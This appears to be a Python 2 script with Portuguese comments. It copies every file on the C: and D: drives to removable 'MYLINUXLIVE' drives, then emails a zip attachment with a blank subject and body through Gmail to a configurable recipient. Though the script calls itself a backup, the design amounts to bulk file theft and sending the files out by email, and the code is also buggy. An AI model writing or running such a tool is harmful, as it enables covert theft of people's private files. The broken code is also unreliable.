#!/usr/bin/env python
# -*- coding: utf-8 -*-

# def code_for_live():

# this thing is very insteresting... 

import smtplib, zlib

from time import sleep
import time

from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders 

import os # , usb
import re
import shutil

# função para encontrar os arquivos
# function to find the files

def find_files(pattern, path):
    for path, dirs, files in os.walk(path):
        for filename in files:
            full_file_name = os.path.join(path, filename)
            match = re.match(pattern, full_file_name)
            if match:
                yield full_file_name

# função para copiar os arquivos encontrados
# function to copy match files
 
def copy_files(pattern, src_path, dest_path):
    
    for full_file_name in find_files(pattern, src_path):
        
        print(full_file_name) + ' file copied into ' + (dest_path)
 
        try:
            shutil.copy(full_file_name, dest_path)
           # shutil.make_archive(full_file_name, 'zip', dest_path)
    
        except IOError:
    
            pass
       

# função para mandar os arquivos copiados em formato .zip para o email desejado.

# function to send the files in .zip format to defined email

def send_to_email():
 
    fromaddress = "email0@gmail.com"
    toaddress = "email1@gmail.com" # mudar para mandar para a pessoa desejada

    msg = MIMEMultipart()

    msg['de'] = fromaddress 
    msg['para'] = toaddress
    msg['assunto'] = "."

    body = " . "

    msg.attach(MIMEText(body, 'plain'))

    full_file_name = "teste0.zip"
    attachment = open(full_file_name, "rb")

    part = MIMEBase('application', 'octet-stream') 
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename=' + full_file_name)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddress, "suasenha")
    text = msg.as_string()
    server.sendmail(fromaddress, toaddress, text)
    print '\nfeito\narquivo enviado'
    server.quit()  
if __name__ == '__main__':

    copy_files('.', '/home/user/teste0', '/home/user/teste') or copy_files('.', 'C:', 'F:\MYLINUXLIVE') or copy_files('.', 'C:', 'G:\MYLINUXLIVE') or copy_files('.', 'D:', 'H:\MYLINUXLIVE') or copy_files('.', 'D:', 'F:\MYLINUXLIVE') or copy_files('.', 'D:', 'F:\MYLINUXLIVE')
    # ^ here you specify the path where the files to be backuped are, and the path where the files will be storaged
    
    send_to_email()
